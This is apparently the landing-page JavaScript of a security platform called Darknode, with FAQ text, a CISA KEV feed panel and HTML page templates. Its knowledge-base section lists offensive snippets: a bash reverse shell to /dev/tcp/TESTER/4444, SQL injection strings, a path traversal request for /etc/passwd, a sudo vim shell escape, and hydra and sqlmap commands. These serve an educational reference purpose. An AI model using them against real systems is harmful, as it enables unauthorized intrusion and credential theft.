// Copyright (c) 2026 Darknode-Official. All rights reserved.
// Source-available for learning only. Redistribution prohibited. See LICENSE.
(function(){var _h=location.hostname,_a=["darknode.ai","www.darknode.ai","sentinel-b4194.web.app","sentinel-b4194-6173e.web.app","localhost","127.0.0.1"];if(!_a.some(function(d){return _h===d})&&!/^darknode-web-[a-z0-9]+\.onrender\.com$/.test(_h)&&!/^sentinel-b4194(-6173e)?--[a-z0-9-]+\.web\.app$/.test(_h))throw document.body.innerHTML="",new Error("unlicensed")}());

import { db } from "/js/firebase.js?v=20261021a";
import { collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/12.17.0/firebase-firestore.js";
import { mountLandingCheck } from "/js/check/landing-check.js?v=1";

const GITHUB = "https://github.com/Darknode-Official";

// Desktop app downloads. The exact asset name carries a version, so instead of
// hardcoding a URL that rots on every release we resolve the right installer for
// the visitor's OS at click time from the latest GitHub release (same source the
// in-console download page uses). Falls back to the releases page if that fails.
// Flip to true once darknode-app publishes a release with installers
// (.AppImage / .dmg / Setup.exe). Until then the desktop-app card shows the
// platform tag instead of a download button, so we never link to an empty page.
const APP_DL_LIVE = true;
const APP_REPO = "Darknode-Official/darknode-app";
const APP_RELEASES = "https://github.com/" + APP_REPO + "/releases/latest";
const APP_OS_LABEL = { linux: "Linux", mac: "macOS", windows: "Windows" };
// First matching asset wins per OS (AppImage preferred over .deb on Linux).
const APP_OS_MATCH = {
  windows: [/setup.*\.exe$/i, /\.exe$/i],
  mac: [/\.dmg$/i],
  linux: [/\.appimage$/i, /_amd64\.deb$/i],
};
function appDetectOS() {
  const s = (navigator.userAgent + " " + (navigator.platform || "")).toLowerCase();
  if (s.includes("win")) return "windows";
  if (s.includes("mac") || s.includes("iphone") || s.includes("ipad")) return "mac";
  return "linux";
}
async function appResolveAsset(os) {
  try {
    const r = await fetch("https://api.github.com/repos/" + APP_REPO + "/releases/latest");
    if (r.ok) {
      const rel = await r.json();
      const assets = rel.assets || [];
      for (const re of (APP_OS_MATCH[os] || [])) {
        const a = assets.find((x) => re.test(x.name || ""));
        if (a && a.browser_download_url) return a.browser_download_url;
      }
    }
  } catch (_) {}
  return null;
}

// "Vendor Product", without repeating the vendor when CISA lists it in the product too
// ("UnrealIRCd" / "UnrealIRCd", "Apple" / "Apple iOS").
function kevName(vendor, product) {
  const v = String(vendor || "").trim(), p = String(product || "").trim();
  if (!v || !p) return v || p;
  const pl = p.toLowerCase(), vl = v.toLowerCase();
  return pl === vl || pl.startsWith(vl + " ") ? p : v + " " + p;
}

// Hero side panel: the newest CISA KEV additions from the daily same-origin feed. Real data
// only; on failure the panel says so instead of showing anything made up.
function loadHeroLive(view) {
  const box = view.querySelector("#hxLiveB"); if (!box) return;
  const e = (x) => String(x == null ? "" : x).replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
  fetch("/data/feeds/kev-recent.json", { cache: "no-cache" }).then((r) => (r.ok ? r.json() : null)).then((d) => {
    if (!box.isConnected) return;
    const rows = (d && Array.isArray(d.data) ? d.data : []).slice(0, 5);
    if (!rows.length) { box.innerHTML = '<div class="hx-live-msg">No new entries in the last two weeks.</div>'; return; }
    box.innerHTML = rows.map((v) => `<a class="hx-row" href="https://nvd.nist.gov/vuln/detail/${encodeURIComponent(v.cve)}" target="_blank" rel="noopener"><span class="hx-cve">${e(v.cve)}</span><span class="hx-what">${e(kevName(v.vendor, v.product))}${v.ransomware ? ' <span class="hx-rw">Ransomware</span>' : ""}</span><span class="hx-when">${e(String(v.dateAdded || "").slice(5))}</span></a>`).join("");
    const f = view.querySelector("#hxLiveF");
    if (f && d.count) f.textContent = d.count + " added to the catalog in the last 14 days" + (d.catalogVersion ? " (version " + d.catalogVersion + ")" : "") + ". The Deck matches them against what you run.";
  }).catch(() => { if (box.isConnected) box.innerHTML = '<div class="hx-live-msg">The live feed could not be loaded right now.</div>'; });
}

// The home page's "What it checks" grid. Every line must stay true of what ships (the Deck's
// tool help in js/ui/explain.js describes each check); change it when a check changes.
const CHECKS = [
  { title: "Exploited right now", icon: '<path d="M12 3l9.5 17h-19z"/><path d="M12 10v4M12 17h.01"/>',
    what: "New entries in CISA&rsquo;s known-exploited catalog and FIRST EPSS exploit scores, matched against the CVEs in your findings.",
    fix: "a patch order driven by real exploitation, not CVSS alone." },
  { title: "Domain and email", icon: '<rect x="3" y="5" width="18" height="14" rx="2"/><path d="M3 7l9 6 9-6"/>',
    what: "SPF, DKIM and DMARC, TLS certificates, security headers, cookies and DNS, looked up live.",
    fix: "the record or header to publish, written out." },
  { title: "Attack surface", icon: '<circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3c2.5 2.7 3.8 5.7 3.8 9s-1.3 6.3-3.8 9M12 3C9.5 5.7 8.2 8.7 8.2 12s1.3 6.3 3.8 9"/>',
    what: "What the internet can see for your domain: subdomains from certificate logs, DNS, the network it sits on, mail security and web headers.",
    fix: "each gap flagged in plain terms, and one click to track it in your security graph." },
  { title: "Code and secrets", icon: '<path d="M8 7l-5 5 5 5M16 7l5 5-5 5M13.5 4l-3 16"/>',
    what: "Static analysis of a GitHub repository or local folder for injection risks, unsafe code and leaked keys, down to the file and line.",
    fix: "a fix note for each rule, such as how to revoke and rotate a leaked key." },
  { title: "Dependencies", icon: '<path d="M21 8l-9-5-9 5 9 5 9-5z"/><path d="M3 8v8l9 5 9-5V8M12 13v8"/>',
    what: "Manifests and lockfiles checked against the OSV database and weighted by known exploitation, with licence and typosquat checks.",
    fix: "the version that fixes each vulnerable package." },
  { title: "Cloud and infrastructure as code", icon: '<path d="M7 18h10.5a4 4 0 00.6-7.96A6 6 0 006.3 9.2 4.5 4.5 0 007 18z"/>',
    what: "IAM and bucket policies, security groups, Terraform, CloudFormation, Kubernetes and Dockerfiles, checked in your browser.",
    fix: "each misconfiguration with the setting to change." },
];

// FAQ: [question, answer, onlyOnFaqPage]. The home page shows the first six (the ones that
// decide whether to sign up); /faq shows them all. Keep the plan answer in step with the
// pricing cards and the docs FAQ "Which tools do I get on my plan?".
const FAQ = [
  ["What is free, and how do paid plans work?",
    "Free includes the Quick Checks (email security, website headers, certificates, DNS, breaches and CVEs), the Personal space, the live vulnerability feed, a local security graph and case files, the free browser tools in the Tool Library, and the Darknode assistant with 50 messages a day. The CLI is free to run from source. Pro adds the Exposure and Application Security tools, saved findings and reports, premium AI models and cloud sync; Team adds the Organization space, identity and security-operations tools and shared workspaces; Enterprise adds risk and compliance tooling. Tools outside your plan are simply not shown. Paid plans are in preview: checkout is not live yet, so upgrades are requested and granted by hand and no payment is taken."],
  ["Does our code or data leave our environment?",
    "Your saved findings stay in your browser unless you turn on cloud sync, a Pro feature. Code, cloud and infrastructure-as-code files you load are analysed on your device and are not uploaded to us; dependency checks send package names and versions to the public OSV database. Live checks against a domain (DNS, headers, certificate transparency) go through our edge proxy and are not stored. The built-in assistant sends your question through that proxy to the model you choose (Google Gemini on every plan, Anthropic Claude on Pro); we do not log or store prompts or answers. Nexus in the CLI can use a local Ollama model, so nothing leaves your machine."],
  ["Can I run Darknode offline or air-gapped?",
    "The CLI and Nexus can. Install them from source and use a local Ollama model, and they run on your own machine without a Darknode account; Nexus has <code>/offline</code> to block cloud engines entirely. The website and the desktop app need a connection: sign-in, live domain checks and the hosted assistant go through our servers."],
  ["How is this different from a standalone scanner?",
    "Most tools cover one surface. Darknode checks your domain, code, dependencies and cloud configuration in one workspace, ranks findings with deterministic rules and live exploitation data (CISA KEV and FIRST EPSS) rather than a model&rsquo;s opinion, and gives each one a concrete fix. The optional assistant explains findings and drafts remediation steps; it never decides severity."],
  ["Which AI models does it use, and do I need a key?",
    "No key is needed to start. On darknode.ai the built-in assistant runs Google Gemini on every plan (50 messages a day on Free); Pro adds Claude Fable 5.1, Claude Opus 5.5 and Darknode Max with higher limits. You can also connect your own provider key. Nexus, the terminal agent in the CLI, drives six engines through one interface: Claude Code, the Gemini CLI, Codex, OpenCode, Aider, and Ollama for free local models. There is no per-token billing on any plan."],
  ["Is it legal to use?",
    "Yes, on systems you own or are authorized to assess. Domain and certificate checks read only public signals such as DNS, headers and certificate logs. Tools that send requests to a target, such as a port scan or the API, WebSocket and fuzzing tools, must only be pointed at systems you own or have written permission to test. Testing systems without authorization is illegal whatever tool you use."],
  ["Can I use this for professional security assessments?",
    "Yes, within scope. Darknode covers the assessment workflow: scanning code, dependencies, cloud configuration and web exposure; triaging findings by real severity; and building a report you can hand over. The hands-on web-security tools (security headers, CSP, CORS, cookies, API and WebSocket testing) work against targets you name. Always operate within your engagement scope and rules of engagement, and keep written authorization for every system you test.", true],
  ["What are the system requirements?",
    "For the web platform (darknode.ai): any modern browser (Chrome, Firefox, Safari, Edge). For the CLI: Node.js 18+ on Windows, macOS, or Linux. For local AI models via Ollama: 16 GB RAM minimum (32 GB recommended for larger models). For practice labs: Docker installed and running. For Darknode OS (Custom Kernel): VirtualBox or QEMU with 128 MB RAM. For Darknode OS (Linux Edition): VirtualBox or VMware with 4 GB RAM and 40 GB disk space. The desktop app is available as .AppImage (Linux), .dmg (macOS), and .exe (Windows).", true],
  ["Can I contribute or modify the code?",
    "The Darknode source code is publicly available on GitHub for transparency and learning purposes. You can read, study, and reference the code to understand how the platform works. However, copying, forking, redistribution, and commercial use are not permitted under the license. If you find a bug or have a feature request, please open an issue on GitHub &mdash; we actively review and respond to community feedback.", true],
  ["Where can I get help?",
    "Once you are signed in, the docs are at <a href=\"/docs\">darknode.ai/docs</a>; in Nexus, run <code>/docs</code> to search every command and key. For bug reports and feature requests, open an issue on our GitHub repository. For account issues, use the in-app feedback form or email contact@darknode.ai.", true],
];

// Pages that are not on the home page: each renders only at its own path (PAGE_ROUTES in
// renderLanding), and the home page links to them from one line under "Where it runs".
const PAGE_ONLY = {
  "/nexus": () => `
    <!-- ====== NEXUS ENGINE ====== -->
    <section class="section nx-section" id="nexus" aria-labelledby="nexus-title">
      <div class="nx-section-glow"></div>
      <div class="wrap">
        <div class="sec-label">AI Assistant</div>
        <h2 class="sec-title" id="nexus-title">Nexus &mdash; the assistant on top of your findings</h2>
        <p class="sec-sub">The deterministic engines do the finding and ranking; Nexus turns those results into plain-English explanations, remediation steps, and draft reports. It runs on your choice of backend &mdash; Claude, GPT, Gemini, Groq, Mistral and OpenRouter in the cloud, or a fully local model via Ollama for teams that keep everything in-house.</p>

        <!-- Architecture diagram -->
        <div class="nx-arch" aria-label="Nexus architecture diagram">
          <div class="nx-arch-layer nx-arch-l1">
            <div class="nx-arch-header">
              <span class="nx-arch-label">6 AI Engines</span>
              <span class="nx-arch-tag">Layer 1</span>
            </div>
            <div class="nx-arch-pills">
              <span class="nx-arch-pill">Claude</span>
              <span class="nx-arch-pill">Gemini</span>
              <span class="nx-arch-pill">Codex</span>
              <span class="nx-arch-pill">OpenCode</span>
              <span class="nx-arch-pill">Aider</span>
              <span class="nx-arch-pill">Ollama</span>
            </div>
          </div>
          <div class="nx-arch-connector"></div>
          <div class="nx-arch-layer nx-arch-l2">
            <div class="nx-arch-header">
              <span class="nx-arch-label">Planning &amp; Orchestration</span>
              <span class="nx-arch-tag">Layer 2</span>
            </div>
            <div class="nx-arch-pills">
              <span class="nx-arch-pill">Planner</span>
              <span class="nx-arch-pill">Agents</span>
              <span class="nx-arch-pill">Pipelines</span>
              <span class="nx-arch-pill">Batch</span>
              <span class="nx-arch-pill">Background Jobs</span>
              <span class="nx-arch-pill">Race &amp; Ensemble</span>
              <span class="nx-arch-pill">Cowork</span>
            </div>
          </div>
          <div class="nx-arch-connector"></div>
          <div class="nx-arch-layer nx-arch-l3">
            <div class="nx-arch-header">
              <span class="nx-arch-label">Memory &amp; Context</span>
              <span class="nx-arch-tag">Layer 3</span>
            </div>
            <div class="nx-arch-pills">
              <span class="nx-arch-pill">Memory</span>
              <span class="nx-arch-pill">Sessions</span>
              <span class="nx-arch-pill">Repo Map</span>
              <span class="nx-arch-pill">Code Intel</span>
              <span class="nx-arch-pill">File State</span>
              <span class="nx-arch-pill">Rewind &amp; Undo</span>
            </div>
          </div>
          <div class="nx-arch-connector"></div>
          <div class="nx-arch-layer nx-arch-l4">
            <div class="nx-arch-header">
              <span class="nx-arch-label">Verification</span>
              <span class="nx-arch-tag">Layer 4</span>
            </div>
            <div class="nx-arch-pills">
              <span class="nx-arch-pill">Verify</span>
              <span class="nx-arch-pill">Code Review</span>
              <span class="nx-arch-pill">Code Radar</span>
              <span class="nx-arch-pill">Smart Tests</span>
              <span class="nx-arch-pill">Invariants</span>
              <span class="nx-arch-pill">Bisect</span>
              <span class="nx-arch-pill">Diagnose</span>
              <span class="nx-arch-pill">Loop Guard</span>
            </div>
          </div>
          <div class="nx-arch-connector"></div>
          <div class="nx-arch-layer nx-arch-l5">
            <div class="nx-arch-footer-band">Ships in the Darknode CLI &mdash; runs in your own terminal with your own engine credentials</div>
          </div>
        </div>

        <!-- Feature highlights -->
        <div class="nx-highlights">
          <div class="nx-hl">
            <div class="nx-hl-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v3m0 12v3M3 12h3m12 0h3m-3.5-6.5L16 7m-8 10l-2.5 2.5M20.5 18.5L18 16M5.5 7L3.5 5.5"/><circle cx="12" cy="12" r="4"/></svg>
            </div>
            <h3>Multi-engine</h3>
            <p>Switch between 6 AI engines, race them against each other, or combine their answers.</p>
          </div>
          <div class="nx-hl">
            <div class="nx-hl-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M9 3H5a2 2 0 00-2 2v4m6-6h10a2 2 0 012 2v4M9 3v18m0 0H5a2 2 0 01-2-2v-4m6 6h10a2 2 0 002-2v-4"/><path d="M14 9l-1 2 3 2-1 2"/></svg>
            </div>
            <h3>Autonomous</h3>
            <p>Give it a goal and it plans, runs and checks the work. Background jobs keep long tasks running while you work.</p>
          </div>
          <div class="nx-hl">
            <div class="nx-hl-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/><circle cx="12" cy="16" r="1"/></svg>
            </div>
            <h3>Private</h3>
            <p>Runs 100% locally with Ollama. Your code and prompts never leave your machine. Signed in, it only reports its version and OS so we know what to support (/shareusage off stops it).</p>
          </div>
        </div>

        <!-- Standout commands -->
        <div class="nx-cmds">
          <div class="nx-cmds-head"><h3>Commands worth knowing</h3><a href="https://github.com/Darknode-Official/darknode-cli/blob/main/docs/NEXUS-COMMANDS.md" target="_blank" rel="noopener">See every command</a></div>
          <div class="nx-cmds-grid">
            <div class="nx-cmd"><code>/cheap</code><span>Turns on only the savers that cannot lower answer quality: same model, fewer billed tokens.</span></div>
            <div class="nx-cmd"><code>/warm</code><span>Shows the prompt-cache countdown and what your next message costs warm vs cold.</span></div>
            <div class="nx-cmd"><code>/race</code><span>Sends one prompt to every engine at once so you can keep the best answer.</span></div>
            <div class="nx-cmd"><code>/review</code><span>A different engine gives a second opinion on the last answer.</span></div>
            <div class="nx-cmd"><code>/codereview</code><span>Parallel reviewers, each finding checked by a verifier, ranked by severity.</span></div>
            <div class="nx-cmd"><code>/guard</code><span>Checks destructive shell commands before they run.</span></div>
            <div class="nx-cmd"><code>/undo</code><span>Git checkpoints before every turn that changes files, so any turn can be rolled back.</span></div>
            <div class="nx-cmd"><code>nexus bg</code><span>Runs sessions in the background; nexus attach takes one over later.</span></div>
          </div>
          <div class="nx-cheap" data-nx-cheap>
            <h4>What <code>/cheap</code> saves, by model</h4>
            <p class="nx-cmds-foot">Loading the measurement...</p>
          </div>
        </div>

        <!-- Collapsible module list -->
        <details class="nx-details">
          <summary>See the main modules &darr;</summary>
          <div class="nx-modules">
            <div class="nx-group">
              <h3>Intelligence</h3>
              <span>Code Intel</span><span>Repo Map</span><span>Read Symbol</span><span>Code Radar</span><span>Threat Model</span><span>Security KB</span><span>Threat Intel</span>
            </div>
            <div class="nx-group">
              <h3>Execution</h3>
              <span>Planner</span><span>Agents</span><span>Pipelines</span><span>Batch</span><span>Background Jobs</span><span>Shell Run</span><span>Web Search</span><span>Browser</span>
            </div>
            <div class="nx-group">
              <h3>Memory</h3>
              <span>Memory</span><span>Sessions</span><span>File State</span><span>Rewind &amp; Undo</span><span>Todos</span>
            </div>
            <div class="nx-group">
              <h3>Quality</h3>
              <span>Verify</span><span>Code Review</span><span>Smart Tests</span><span>Invariants</span><span>Attest</span><span>Bisect</span><span>Explain Break</span><span>Diagnose</span><span>Loop Guard</span>
            </div>
            <div class="nx-group">
              <h3>Security</h3>
              <span>Vuln Scanner</span><span>Pentest Engine</span><span>Attack Planner</span><span>Finding Validation</span><span>Git Security</span><span>Env Audit</span><span>Incident Response</span><span>Report Generator</span>
            </div>
            <div class="nx-group">
              <h3>Infrastructure</h3>
              <span>MCP Bridge</span><span>Ask Bridge</span><span>Guardrails</span><span>Redaction</span><span>Jail</span><span>Dashboard</span><span>6 AI Engines</span>
            </div>
          </div>
        </details>
      </div>
    </section>
`,
  "/security-knowledge": () => `
    <!-- ====== SECURITY KNOWLEDGE ====== -->
    <section class="section" id="security-knowledge" aria-labelledby="rag-title">
      <div class="wrap">
        <div class="sec-label">Knowledge base</div>
        <h2 class="sec-title" id="rag-title">Every finding comes with the context to fix it</h2>
        <p class="sec-sub">A deep, structured knowledge base covering OWASP standards, real-world attack patterns, and remediation guidance — so your engineers understand each finding and know exactly how to close it.</p>
        <div class="rag-tabs" role="tablist" aria-label="Knowledge categories">
          <button class="rag-tab active" role="tab" aria-selected="true" data-rag="owasp">OWASP Top 10</button>
          <button class="rag-tab" role="tab" aria-selected="false" data-rag="attacks">Security Patterns</button>
          <button class="rag-tab" role="tab" aria-selected="false" data-rag="tools">Cheat Sheets</button>
          <button class="rag-tab" role="tab" aria-selected="false" data-rag="privesc">Privilege Escalation</button>
          <button class="rag-tab" role="tab" aria-selected="false" data-rag="recon">Network Recon</button>
        </div>

        <div class="rag-panel active" data-rag-panel="owasp">
          <div class="rag-grid">
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Broken Access Control</h3>
                <span class="sev critical">Critical</span>
              </div>
              <p>Insecure direct object references (IDOR), missing function-level authorization checks, and path traversal. Unauthorized users may modify identifiers to access other users' data.</p>
              <div class="rag-code"><code>GET /api/user/124  -->  GET /api/user/125</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Injection</h3>
                <span class="sev critical">Critical</span>
              </div>
              <p>SQL injection, command injection, and cross-site scripting. Unsanitized user input is interpreted as code by the backend or database engine.</p>
              <div class="rag-code"><code>' OR 1=1 --</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Security Misconfiguration</h3>
                <span class="sev high">High</span>
              </div>
              <p>Default credentials left in production, debug mode enabled, missing security headers, unnecessary services exposed. The most common class of real-world findings.</p>
              <div class="rag-code"><code>X-Powered-By: Express\nServer: Apache/2.4.49</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Cryptographic Failures</h3>
                <span class="sev high">High</span>
              </div>
              <p>Weak or missing encryption for data in transit and at rest. Deprecated algorithms, hardcoded secrets, and exposed sensitive data in logs or error messages.</p>
              <div class="rag-code"><code>Set-Cookie: session=abc123  (missing Secure; HttpOnly)</code></div>
            </div>
          </div>
        </div>

        <div class="rag-panel" data-rag-panel="attacks">
          <div class="rag-grid">
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Authentication Bypass</h3>
                <span class="sev critical">Critical</span>
              </div>
              <p>SQL injection in login forms, default credentials, JWT manipulation, and comment-based truncation. Bypasses authentication entirely without valid credentials.</p>
              <div class="rag-code"><code>admin' --\n' OR 1=1 --\n' UNION SELECT null,null --</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Remote Access</h3>
                <span class="sev critical">Critical</span>
              </div>
              <p>Technique establishing an outbound connection from a target system back to a testing listener, granting interactive shell access for assessment.</p>
              <div class="rag-code"><code>bash -i >& /dev/tcp/TESTER/4444 0>&1</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Directory Traversal</h3>
                <span class="sev high">High</span>
              </div>
              <p>Path manipulation to escape the web root and read arbitrary files on the server. Targets configuration files, credentials, and system internals.</p>
              <div class="rag-code"><code>GET /download?file=../../../etc/passwd</code></div>
            </div>
          </div>
        </div>

        <div class="rag-panel" data-rag-panel="tools">
          <div class="rag-grid">
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Nmap Service Scan</h3>
                <span class="sev medium">Medium</span>
              </div>
              <p>Network mapper with version detection. Identifies open ports, running services, and OS fingerprints. The first step in any engagement's reconnaissance phase.</p>
              <div class="rag-code"><code>nmap -sV -sC -O -p- 10.10.14.7</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>SQLMap Automated Injection</h3>
                <span class="sev critical">Critical</span>
              </div>
              <p>Automated SQL injection testing and database assessment. Detects injection points, enumerates databases, reads files, and tests access controls on target applications.</p>
              <div class="rag-code"><code>sqlmap -u "http://target/page?id=1" --dbs --batch</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Gobuster Directory Discovery</h3>
                <span class="sev medium">Medium</span>
              </div>
              <p>High-speed directory and file enumeration using wordlists. Discovers hidden admin panels, backup files, API endpoints, and configuration files.</p>
              <div class="rag-code"><code>gobuster dir -u http://target -w /usr/share/wordlists/common.txt</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Hydra Credential Testing</h3>
                <span class="sev high">High</span>
              </div>
              <p>Online credential tester supporting 50+ protocols. Tests credential pairs against SSH, FTP, HTTP forms, databases, and other network services.</p>
              <div class="rag-code"><code>hydra -l admin -P rockyou.txt ssh://10.10.14.7</code></div>
            </div>
          </div>
        </div>

        <div class="rag-panel" data-rag-panel="privesc">
          <div class="rag-grid">
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>SUID Binary Analysis</h3>
                <span class="sev critical">Critical</span>
              </div>
              <p>Finding binaries with the SUID bit set that could allow privilege escalation from a low-privilege user to root. Common findings include custom scripts and misconfigured system utilities.</p>
              <div class="rag-code"><code>find / -perm -4000 -type f 2>/dev/null</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Sudo Misconfigurations</h3>
                <span class="sev critical">Critical</span>
              </div>
              <p>Identifying overly permissive sudo rules. Users allowed to run specific binaries as root without password may be able to escalate privileges through those binaries.</p>
              <div class="rag-code"><code>sudo -l\nsudo vim -c ':!/bin/bash'</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Cron Job Hijacking</h3>
                <span class="sev high">High</span>
              </div>
              <p>Identifying writable scripts executed by root cron jobs. Replacing or appending to these scripts grants code execution as root on the next scheduled run.</p>
              <div class="rag-code"><code>cat /etc/crontab\nls -la /var/spool/cron/</code></div>
            </div>
          </div>
        </div>

        <div class="rag-panel" data-rag-panel="recon">
          <div class="rag-grid">
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Subdomain Enumeration</h3>
                <span class="sev medium">Medium</span>
              </div>
              <p>Discovering hidden subdomains through DNS brute-forcing, certificate transparency logs, and passive OSINT sources. Expands the scope of assessment significantly.</p>
              <div class="rag-code"><code>subfinder -d target.com -silent | httpx -title -status-code</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>DNS Zone Transfer</h3>
                <span class="sev high">High</span>
              </div>
              <p>Attempting AXFR requests against misconfigured DNS servers. A successful transfer reveals every record in the zone -- hosts, mail servers, internal infrastructure.</p>
              <div class="rag-code"><code>dig axfr @ns1.target.com target.com</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>SMB Enumeration</h3>
                <span class="sev high">High</span>
              </div>
              <p>Enumerating Windows shares, users, and groups through the SMB protocol. Discovers open shares, null sessions, and credentials stored in accessible file shares.</p>
              <div class="rag-code"><code>enum4linux -a 10.10.14.7\nsmbclient -L //10.10.14.7 -N</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Web Technology Fingerprinting</h3>
                <span class="sev medium">Medium</span>
              </div>
              <p>Identifying frameworks, CMS platforms, server software, and client-side libraries. Guides assessment planning by revealing the exact technology stack in use.</p>
              <div class="rag-code"><code>whatweb http://target.com -v\nwappalyzer http://target.com</code></div>
            </div>
          </div>
        </div>
      </div>
    </section>
`,
  "/darknode-os": () => `
    <!-- ====== DARKNODE OS ====== -->
    <section class="section alt" id="darknode-os" aria-labelledby="os-title">
      <div class="wrap">
        <div class="sec-label">Darknode OS</div>
        <h2 class="sec-title" id="os-title">Your own security operating system</h2>
        <p class="sec-sub">Two editions: a from-scratch x86 research kernel, and a Linux desktop with the Darknode CLI and Nexus. Both run in a virtual machine on your own hardware.</p>
        <div class="os-grid">
          <div class="os-card">
            <div class="os-card-icon"><svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg></div>
            <h3 class="os-card-title">Darknode OS — Custom Kernel</h3>
            <p class="os-card-desc">Built from scratch &mdash; no Linux, no borrowed code. A from-scratch x86 research kernel with its own shell and filesystem that boots under QEMU. An ongoing systems-programming project, not a daily driver.</p>
            <ul class="os-features">
              <li>Multiboot2 boot &rarr; GRUB bootloader</li>
              <li>VGA console, PS/2 keyboard, PIT timer</li>
              <li>Physical memory manager + heap allocator</li>
              <li>VFS, ramfs, devfs filesystems</li>
              <li>Round-robin process scheduler</li>
              <li>ATA disk + NE2000 NIC drivers</li>
              <li>Ethernet, ARP, IPv4, ICMP, UDP, DHCP, DNS</li>
              <li>28-command built-in shell</li>
            </ul>
            <div class="os-card-meta">12 MB &middot; Boots in VirtualBox &amp; QEMU</div>
            <a href="https://github.com/Darknode-Official/darknode-os/releases/download/v0.1.0/darknode-os.iso" class="btn lg os-dl" target="_blank" rel="noopener">Download ISO</a>
          </div>
          <div class="os-card">
            <div class="os-card-icon"><svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"/><line x1="4" y1="22" x2="4" y2="15"/></svg></div>
            <h3 class="os-card-title">Darknode OS — Linux Edition</h3>
            <p class="os-card-desc">Desktop environment built on Ubuntu 24.04 LTS, with the Darknode CLI, the Nexus agent and a security toolset installed on its first boot.</p>
            <ul class="os-features">
              <li>Ubuntu 24.04 LTS with XFCE desktop</li>
              <li>Darknode CLI + Nexus pre-installed</li>
              <li>nmap, sqlmap, nuclei, ffuf, httpx</li>
              <li>Custom wallpapers, icons, and theming</li>
              <li>Cloud-init provisioning on first boot (needs a network connection)</li>
            </ul>
            <div class="os-card-meta">370 MB download &middot; Self-provisions on first boot</div>
            <a href="https://github.com/Darknode-Official/darknode-os/releases/download/v1.0.0/darknode-os-ubuntu-slim.qcow2.xz" class="btn lg os-dl" target="_blank" rel="noopener">Download qcow2</a>
          </div>
        </div>
        <div class="os-boot-preview">
          <div class="term-window">
            <div class="term-bar"><span class="term-dot"></span><span class="term-dot"></span><span class="term-dot"></span><span class="term-title">darknode-os</span></div>
            <pre class="term-body">
  ____             _                     _        ___  ____
 |  _ \\  __ _ _ __| | ___ __   ___   __| | ___  / _ \\/ ___|
 | | | |/ _\` | '__| |/ / '_ \\ / _ \\ / _\` |/ _ \\| | | \\___ \\
 | |_| | (_| | |  |   &lt;| | | | (_) | (_| |  __/| |_| |___) |
 |____/ \\__,_|_|  |_|\\_\\_| |_|\\___/ \\__,_|\\___| \\___/|____/

 Darknode OS v0.1.0 — Custom x86 Kernel
 Memory: 128 MB | Timer: 1000 Hz | Disk: ATA PIO
 Network: NE2000 NIC | Stack: IPv4/ICMP/UDP/DHCP/DNS
 Filesystems: ramfs, devfs mounted

 nexus&gt; help
 Available commands (28):
   help ls cat mkdir touch write rm cd pwd ps mount
   disk free mem cpuinfo time uptime echo version
   clear reboot shutdown ifconfig ping arp dhcp dns netstat

 nexus&gt; _</pre>
          </div>
        </div>
      </div>
    </section>
`,
  "/government": () => `
    <!-- ====== GOVERNMENT & ENTERPRISE ====== -->
    <section class="section gov-section" id="government" aria-labelledby="gov-title">
      <div class="wrap">
        <div class="sec-label">Government &amp; Enterprise</div>
        <h2 class="sec-title" id="gov-title">Built for government and regulated industries</h2>
        <p class="sec-sub">For teams that answer to NIST, FedRAMP, CMMC or HIPAA: control mapping, vulnerability deadlines and audit evidence, built from your own findings.</p>
        <div class="gov-grid">
          <div class="gov-card">
            <div class="gov-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M9 5h11M9 12h11M9 19h11"/><path d="M4 5l1 1 2-2M4 12l1 1 2-2M4 19l1 1 2-2"/></svg></div>
            <h3>Federal Compliance Mapper</h3>
            <p>A reference crosswalk of a representative NIST SP 800-53 Rev 5 subset to CSF 2.0, FedRAMP, CMMC 2.0, CJIS and HIPAA, with a self-assessment checklist, POA&amp;M drafting and ATO tracking. Progress is saved in your browser.</p>
          </div>
          <div class="gov-card">
